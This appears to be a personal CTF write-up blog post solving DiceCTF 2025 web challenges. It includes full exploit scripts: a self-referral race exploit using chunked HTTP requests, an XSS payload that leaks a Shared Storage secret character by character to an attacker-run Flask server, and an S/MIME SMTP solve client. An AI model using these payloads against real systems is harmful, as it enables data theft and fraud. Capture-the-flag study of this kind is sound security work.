---
date: '2025-04-17T09:48:00+07:00'
draft: false
title: 'DiceCTF 2025'
hideSummary: true
type: "writeups"
description: "Writeup for some web challenge for DiceCTF 2025"
---
## TL;DR
This is a writeup for some web challenge for DiceCTF 2025
## cookie-recipes-v3
This challenge was about a trick in javascript: `(NaN < 1_000_000_000) == false`.
So by passing any "number" that make `Number(number)` return `NaN`, I got the flag.
## pyramid
Looking at the problem, a crazy idea came to my mind which is trying to make 100.000.000.000 users and refer to the target user to get the flag. But that seemed impossible.

The flaw in the logic was:
```javascript
app.get("/cashout", (req, res) => {
    if (req.user) {
        const u = req.user;
        const r = referrer(u.code);
        if (r) {
            [u.ref, r.ref, u.bal] = [0, r.ref + u.ref / 2, u.bal + u.ref / 2];
        } else {
            [u.ref, u.bal] = [0, u.bal + u.ref];
        }
    }
    res.redirect("/");
});
```
This seemed to be safe and balance, but when u and r are the same user, given `u.ref = A`, then:
1. `u.ref = 0`
2. `u.ref = A + A/2 = 1.5*A`
3. `u.bal += 0.5*A`
In this case, it seemed that `u.ref` is increase in exponential manner => reaching 100.000.000.000 is possible in a few iterations.
But how to do so? Looking at `/new` endpoint, I noticed that it collected the body data in a weird manner:
```javascript
app.post("/new", (req, res) => {
    const token = random();

    const body = [];
    req.on("data", Array.prototype.push.bind(body));
    req.on("end", () => {
        const data = Buffer.concat(body).toString();
        console.log("Received data", data);
        const parsed = new URLSearchParams(data);
        const name = parsed.get("name")?.toString() ?? "JD";
        const code = parsed.get("refer") ?? null;

        // referrer receives the referral
        const r = referrer(code);
        if (r) {
            r.ref += 1;
        }
        console.log("Creating user", name, code, r);
        users.set(token, {
            name,
            code,
            ref: 0,
            bal: 0,
        });
    });

    res.header("set-cookie", `token=${token}`);
    res.redirect("/");
});
```
So by sending a POST request to `/new` without a complete body, we can get the token, then make a reference code from that token, then finish the request's body with `refer` is our own token. I chose `Transfer-Encoding: chunked` as normal `Content-Type: application/x-form-urlencoded` needs `Content-Length` which is calculatable but I was too lazy to do so.
```javascript
const net = require("net");

const host = "localhost";
const port = 3000;
const new_path = "/new";
const code_path = "/code";
const home_path = "/";
const cashout_path = "/cashout";
const buy_path = "/buy";
var token = "";

const new_socket = net.createConnection(port, host, () => {
    new_socket.write(
        `POST ${new_path} HTTP/1.1\r\n` +
        `Host: ${host}\r\n` +
        `Transfer-Encoding: chunked\r\n\r\n`
    );
});

const get_code = async (token) => {
    const res = await fetch(`http://${host}:${port}${code_path}`, {
        headers: { Cookie: `token=${token}` },
    });
    const text = await res.text();
    const code = text.split("<strong>")[1].split("</strong>")[0].trim();
    return code;
};

const create_referer = async (code) => {
    const res = await fetch(`http://${host}:${port}${new_path}`, {
        method: "POST",
        body: `name=testtesttest&refer=${code}`,
    });
    return;
};

const make_bail = async (token) => {
    const res = await fetch(`http://${host}:${port}${cashout_path}`, {
        headers: { Cookie: `token=${token}` },
    });
    return;
};

const get_home = async (token) => {
    const res = await fetch(`http://${host}:${port}${home_path}`, {
        headers: { Cookie: `token=${token}` },
    });
    const text = await res.text();
    return text;
};

const buy_flag = async (token) => {
    const res = await fetch(`http://${host}:${port}${buy_path}`, {
        headers: { Cookie: `token=${token}` },
    });
    const text = await res.text();
    return text;
};

new_socket.on("data", async (data) => {
    const res = data.toString();
    console.log(res);
    token = res.split("token=")[1].split("\n")[0].trim();
    console.log("token: " + token);
    const code = await get_code(token);
    const send_data = `name=testtesttest&refer=${code}`;
    new_socket.end(
        send_data.length.toString(16) + "\r\n" + send_data + "\r\n0\r\n\r\n"
    );
    create_referer(code);
    for (let i = 0; i < 65; i++) {
        await make_bail(token);
    }
    const home = await get_home(token);
    console.log("[HOME REQ]: " + home);
    const flag = await buy_flag(token);
    console.log("[FLAG REQ]: " + flag);
});

new_socket.on("end", () => {
    console.log("[New Socket]: Connection closed by server.");
});

new_socket.on("error", (err) => {
    console.error("[New Socket]: TLS Socket Error:", err);
});

// ChatGPT help me proxy from http://localhost:3000 to https://pyramid.dicec.tf:443 by socat TCP-LISTEN:3000,reuseaddr,fork SSL:pyramid.dicec.tf:443,verify=0
```
## nobin
This was an XSS challenge. The endpoint for XSS was given at `/xss` but the main thing here was that the secret for the flag was put in SharedStorage, which can only be access from restricted sources. Reading this [docs](https://developer.mozilla.org/en-US/docs/Web/API/Shared_Storage_API), I knew that: `you can only read shared storage data from inside a worklet` and `Output gates are URL Selection and Run`. I chose the URL Selection as the run was kinda hard to understand.

About the URL Selection, after passed in urls, the selectURL would return the URL with index that return by the worklet. And base on my own testing, I could pass in around 7 urls.

After a while of trials and errors, I came up with this kinda crazy ideas:
```javascript
const alphabet = "0123456789abcdef";
const l = 6;
const count = Math.ceil(alphabet.length / l);
const solve = async () => {
    await sharedStorage.worklet.addModule("SERVER_URL/module.js");

    const truncated_alphabet = alphabet.slice(l * k, l * (k + 1));
    console.log(truncated_alphabet);
    const urls = [
        {
            url: `SERVER_URL/secret?index=${j}${k}0`,
        },
    ];
    for (let i = 0; i < truncated_alphabet.length; i++) {
        urls.push({
            url: `SERVER_URL/secret?secret=${truncated_alphabet[i]}&index=${j}`,
        });
    }
    // console.log(urls);
    sharedStorage
        .selectURL("exploit", urls, {
            resolveToConfig: true,
            data: { index: j, alphabet: truncated_alphabet },
            keepAlive: true,
        })
        .then(
            (config) => {
                if (config) {
                    document.querySelector("#my-frame").config = config;
                }
            },
            (err) => {
                console.error(err);
            }
        );
};

window.onload = () => {
    const frame = document.createElement("fencedframe");
    frame.id = "my-frame";
    document.body.append(frame);
    solve();
    setTimeout(() => {
        if (j >= 16 || k >= count) {
            return;
        }
        fetch(`SERVER_URL/ok?index=${j}`)
            .then((res) => res.text())
            .then((text) => {
                if (text == "OK") {
                    location.href = `/xss?xss=<script>const%20k=0;const%20j=${
                        j + 1
                    }</script><script%20src="SERVER_URL/solve.js"></script>`;
                } else {
                    location.href = `/xss?xss=<script>const%20k=${
                        k + 1
                    };const%20j=${j}</script><script%20src="SERVER_URL/solve.js"></script>`;
                }
            });
    }, 1000);
};
```
I had to set the `location.href` as `sharedStorage.selectURL` was kinda broken on second called.
The idea was simple, I leaked each character of secret via the URL selection, and if the character was correct, it called back to my SERVER_URL with the character.
I hosted the `module.js` as follow:
```javascript
class Exploit {
    async run(urls, data) {
        const secret = await sharedStorage.get("message");
        if (!secret) {
            return 0;
        }
        const charCode = secret[data.index];
        if (!charCode) {
            return 0;
        }
        const alphabet = data.alphabet;
        const index = alphabet.indexOf(charCode);
        console.log("index: ", index, "urls length: ", urls.length);
        return (index + 1) % urls.length;
    }
}
register("exploit", Exploit);
```
and hosted the server with:
```python
from flask import Flask, request, Response
from flask_cors import CORS
import sys

app = Flask(__name__)
CORS(app) # I have to set the CORS, otherwise the browser will not run the JavaScript code

secret_data = ['']*100 # I first forgot how long the secret be :)

server_url = sys.argv[1] if len(sys.argv) > 1 else 'http://localhost:5000'

@app.route('/solve.js')
def solve_js():
    with open('solve.js', 'r') as file:
        js_code = file.read()
    js_code = js_code.replace('SERVER_URL', server_url)
    return Response(js_code, mimetype='application/javascript')

@app.route('/module.js')
def module_js():
    with open('module.js', 'r') as file:
        js_code = file.read()
    return Response(js_code, mimetype='application/javascript')

@app.route('/secret')
def secret():
    if (request.args.get('secret', None) is None or
            request.args.get('index', None) is None):
        return "Missing parameters", 400
    secret_character = request.args.get('secret')    
    index = int(request.args.get('index'))
    print(f"Received secret character: {secret_character} at index {index}", flush=True)
    if 0 <= index < len(secret_data):
        secret_data[index] = secret_character
    else:
        print(f"Index {index} out of range", flush=True)
    print(f"Secret data updated: {''.join(secret_data)}", flush=True)
    return "OK", 200

@app.route('/ok')
def ok():
    index = int(request.args.get('index'))
    if index < 0 or index >= len(secret_data):
        return "Index out of range", 400
    if secret_data[index] == '':
        return "Secret not set", 400
    return "OK", 200

app.run(host='0.0.0.0', port=5000)
```
And after making GET request to `/xss?xss=<script>const%20k=0;const%20j=0</script><script%20src="SERVER_URL/solve.js"></script>`, I eventually got the secret and then the flag.
## bad-chess-challenge
This challenge was about SMTP. Nothing about web exploitation, plain SMTP with S/MIME which made me suffer a lot. Sometimes, I could sign but then it returned invalid signature. After a lot of trials and errors, I came up with my own STMP client (a simple one, kinda insecure, but simple enough to be able to send raw data).
```javascript
const net = require("net");
const EventEmitter = require("events");

class My_SMTP_Client {
    stage = 0;
    socket = null;

    constructor(
        host,
        port,
        from,
        to,
        subject,
        data,
        email_parsed = false,
        debug = false
    ) {
        this.host = host;
        this.port = port;
        this.from = from;
        this.to = to;
        this.subject = subject;
        this.data = data;
        this.emitter = new EventEmitter();
        this.email_parsed = email_parsed;
        this.debug = debug;

        this.socket = net.createConnection(
            { port: port, host: host },
            () => {}
        );
        this.socket.on("data", (data) => {
            const ret_data = data.toString();
            if (this.debug) {
                console.log("Received data: ", ret_data);
            }
            switch (this.stage) {
                case 0:
                    if (ret_data.indexOf("220") !== -1) {
                        this.HELO();
                        this.stage++;
                        break;
                    }
                    this.emitter.emit("error", "[HELO] Error: " + ret_data);
                    break;
                case 1:
                    if (ret_data.indexOf("250") !== -1) {
                        this.MAIL_FROM();
                        this.stage++;
                        break;
                    }
                    this.emitter.emit(
                        "error",
                        "[MAIL FROM] Error: " + ret_data
                    );
                    break;
                case 2:
                    if (ret_data.indexOf("250") !== -1) {
                        this.RCPT_TO();
                        this.stage++;
                        break;
                    }
                    this.emitter.emit("error", "[RCPT TO] Error: " + ret_data);
                    break;
                case 3:
                    if (ret_data.indexOf("250") !== -1) {
                        this.DATA();
                        this.stage++;
                        break;
                    }
                    this.emitter.emit("error", "[DATA] Error: " + ret_data);
                    break;
                case 4:
                    if (ret_data.indexOf("354") !== -1) {
                        this.send_DATA();
                        this.stage++;
                        break;
                    }
                    this.emitter.emit(
                        "error",
                        "[SEND DATA] Error: " + ret_data
                    );
                    break;
                case 5:
                    if (ret_data.indexOf("250") !== -1) {
                        const ret = ret_data.replace(/250[-\s]/g, "");
                        this.socket.end();
                        this.ret = ret;
                        this.emitter.emit("data", ret);
                        break;
                    }
                    this.emitter.emit(
                        "error",
                        "[RECV DATA] Error: " + ret_data
                    );
                    break;
                default:
                    console.log("Unknown stage");
                    break;
            }
        });
        this.socket.on("error", (err) => {
            this.emitter.emit("error", err);
        });
        this.socket.on("end", () => {
            this.emitter.emit("end");
        });
    }
    on(event, handler) {
        this.emitter.on(event, handler);
        return this;
    }

    async HELO() {
        if (!this.socket) {
            console.error("Socket not initialized");
            return;
        }
        await this.socket.write(`HELO ${this.host}\r\n`);
    }

    async MAIL_FROM() {
        if (!this.socket) {
            console.error("Socket not initialized");
            return;
        }
        await this.socket.write(`MAIL FROM:<${this.from}>\r\n`);
    }

    async RCPT_TO() {
        if (!this.socket) {
            console.error("Socket not initialized");
            return;
        }
        await this.socket.write(`RCPT TO:<${this.to}>\r\n`);
    }

    async DATA() {
        if (!this.socket) {
            console.error("Socket not initialized");
            return;
        }
        await this.socket.write(`DATA\r\n`);
    }

    async send_DATA() {
        if (!this.socket) {
            console.error("Socket not initialized");
            return;
        }
        var data;
        if (this.email_parsed) {
            data = this.data + "\r\n.\r\n";
        } else {
            data = `From: <${this.from}>\r\nTo: <${this.to}>\r\n${
                this.subject ? "Subject: " + this.subject : ""
            }\r\n\r\n${this.data}\r\n.\r\n`;
        }
        await this.socket.write(data);
    }
}

exports.My_SMTP_Client = My_SMTP_Client;
```
And here is the logic of solving the challenge:
```javascript
const { My_SMTP_Client } = require("./my_smpt");
const fs = require("fs");
const child_process = require("child_process");

const host = "localhost";
const port = 2525;

const register_client = new My_SMTP_Client(
    host,
    port,
    "testtest@chess",
    "register@chess",
    "Register",
    "test"
);
register_client
    .on("data", (data) => {
        // console.log("Data received:", data);
        const keys = data.split("\r\n\r\n");
        fs.writeFileSync("private.pem", keys[0]);
        fs.writeFileSync("public.pem", keys[1]);
        child_process.execSync(
            "./create_mail.py --from '<testtest@chess>' --to '<admin@chess>' --cert public.pem --key private.pem --out test1.eml --text e4"
        );
        child_process.execSync(
            "./create_mail.py --from '<admin@chess>' --to '<testtest@chess>' --cert public.pem --key private.pem --attach test1.eml --out test2.eml --text f5"
        );
        child_process.execSync(
            "./create_mail.py --from '<testtest@chess>' --to '<admin@chess>' --cert public.pem --key private.pem --attach test2.eml --out test3.eml --text Nc3"
        );
        child_process.execSync(
            "./create_mail.py --from '<admin@chess>' --to '<testtest@chess>' --cert public.pem --key private.pem --attach test3.eml --out test4.eml --text g5"
        );
        child_process.execSync(
            "./create_mail.py --from '<testtest@chess>' --to '<admin@chess>' --cert public.pem --key private.pem --attach test4.eml --out test5.eml --text Qh5"
        );
        const play_data = fs.readFileSync("test5.eml", "utf-8");
        // console.log("play_data", play_data);
        const play_client = new My_SMTP_Client(
            host,
            port,
            "testtest@chess",
            "admin@chess",
            "Play",
            play_data,
            true,
            true
        );
        play_client
            .on("data", (data) => {
                console.log("Data received:", data);
            })
            .on("error", (err) => {
                console.error("Error:", err);
            })
            .on("end", () => {
                console.log("Connection ended");
            });
    })
    .on("error", (err) => {
        console.error("Error:", err);
    })
    .on("end", () => {
        console.log("Connection ended");
    });
```
I think openssl can do this too, but I am not familiar of using openssl so I wrote a simple python script to sign the S/MIME to my liking:
```python
#!/usr/bin/python3

import argparse
import smail
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication

def main():
    parser = argparse.ArgumentParser(description="Send S/MIME signed email with attachment")
    parser.add_argument("--from", dest="sender", required=True, help="Sender email address")
    parser.add_argument("--to", dest="recipient", required=True, help="Recipient email address")
    parser.add_argument("--subject", help="Email subject", default="Test mail")
    parser.add_argument("--text", required=True, help="Plain text body")
    parser.add_argument("--attach", help="Attachment filename", default=None)
    parser.add_argument("--cert", required=True, help="Path to cert.pem")
    parser.add_argument("--key", required=True, help="Path to key.pem")
    parser.add_argument("--out", required=True, help="Output filename")

    args = parser.parse_args()

    # Build the message
    msg = MIMEMultipart()
    msg["From"] = args.sender
    msg["To"] = args.recipient
    msg["Subject"] = args.subject

    # Add text
    msg.attach(MIMEText(args.text, "plain"))

    # Add attachment
    if args.attach:
        try:
            with open(args.attach, "r") as f:
                part = MIMEText(f.read(), "plain")
                part.add_header("Content-Disposition", "attachment", filename="move.txt")
                msg.attach(part)
        except FileNotFoundError:
            print(f"Attachment file {args.attach} not found.")
            exit(1)
    try:
        with open(args.cert, "r") as f:
            cert = f.read()
    except FileNotFoundError:
        print(f"Certificate file {args.cert} not found.")
        exit(1)
    try:
        with open(args.key, "r") as f:
            key = f.read()
    except FileNotFoundError:
        print(f"Key file {args.key} not found.")
        exit(1)
    mail = smail.sign_message(msg, key.encode(), cert.encode()).as_string()

    with open(args.out, "w") as f:
        f.write(mail)
    print(f"Signed email saved to {args.out}")

if __name__ == "__main__":
    main()
```
Run the javascript script would give the flag.
## dicepass
I haven't solved this challenge yet, as I am working on the comlink stuff as I think I could get the `window.dicepass` to return things in the context, I am wondering if I could access other thing beside that.